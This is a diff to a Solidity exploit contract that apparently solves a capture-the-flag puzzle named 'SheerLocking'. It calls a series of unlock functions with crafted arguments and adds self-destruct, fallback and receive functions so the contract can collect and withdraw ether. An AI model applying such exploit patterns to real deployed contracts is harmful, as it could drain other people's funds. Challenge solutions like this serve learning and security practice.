@@ -138,6 +138,8 @@ contract Exploit_JustDravee {
 
     constructor(IChallenge_JustDravee _instance) payable {
         instance = _instance;
+        // instance = IChallenge_JustDravee(address(new SheerLocking()));
+        setup = ISetup_JustDraave(0x1f5c09a7d6a9B30b43DDDAABD384425DEe0ADe91);
 
         bytes8 key1 = hex"ffffffff";
         instance.unSheerLock1{value: 24725 wei}("Benedict ", "Cumberbatch", " is ", "the ", "best", key1);
@@ -149,7 +151,11 @@ contract Exploit_JustDravee {
         instance.unSheerLock7("Jonny ", "Lee ", "", "Miller ", "and Lucy Liu were a good team too!", key1);
     }
 
-    function finalize() external {
+    function finalize() external payable {
         selfdestruct(payable(msg.sender));
     }
+
+    fallback() external payable {}
+
+    receive() external payable {}
 }
